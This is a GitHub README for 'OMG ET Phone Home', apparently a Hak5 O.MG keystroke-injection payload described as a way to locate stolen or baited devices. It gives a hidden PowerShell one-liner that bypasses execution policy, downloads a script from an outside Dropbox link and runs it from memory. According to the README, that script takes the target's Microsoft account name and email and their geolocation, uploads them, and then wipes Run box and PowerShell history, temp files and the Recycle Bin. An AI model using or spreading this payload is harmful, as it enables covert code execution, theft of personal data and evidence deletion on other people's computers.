![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-AcidBurn/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# OMG ET Phone Home

A script I put together to locate your stolen devices, or your "stolen" baited devices

## Description

This program is meant to locate your devices. Save the execution file on the boot partition of your devices and when someone plugs it into their computer
Using a one liner in the run box a script will be downloaded and executed that grabs the Name and email of the associated microsoft account and the 
latitude and longitude of where the device was activated. This information is stored in a text document that is then uploaded to your dropbox. 
Finally the end of the script will delete the runbox and powershell history and delete the files in the TMP Folder and Recycle Bin. 

## Getting Started

### Dependencies

* DropBox - Your Shared link for the intended file
* Windows 7,10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Your device is plugged into the targets computer
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory if your intended wifi network is not detected with the
  geofencing options
```
powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
```
* The OMG device will attempt to detect the Wifi Access point you designated, if it does not.. 
* A one liner in the run box will download and execute the ET-Phone-Home Script 
* This script will get the Name and Email associated with the microsoft account of the persons computer your device connected to 
* The latitude and longitude of where the device was when it was activated will also be collected 
* This gathered information will be saved to a text file in the TMP Directory 
* That file will be uploaded to your DropBox cloud storage 

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here

I am Jakoby

Kalani


<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<div><h2>I am Jakoby</h2></div>
  <p><br/>
  
  <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 
  
  <a href="https://github.com/I-Am-Jakoby/">
    <img src="https://img.shields.io/badge/GitHub-I--Am--Jakoby-blue">
  </a>
  
  <a href="https://www.instagram.com/i_am_jakoby/">
    <img src="https://img.shields.io/badge/Instagram-i__am__jakoby-red">
  </a>
  
  <a href="https://twitter.com/I_Am_Jakoby/">
    <img src="https://img.shields.io/badge/Twitter-I__Am__Jakoby-blue">
  </a>
  
  <a href="https://www.youtube.com/c/IamJakoby/">
    <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
  </a>

  Project Link: [https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG-ET-Phone-Home)
</p>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)



<p align="right">(<a href="#top">back to top</a>)</p>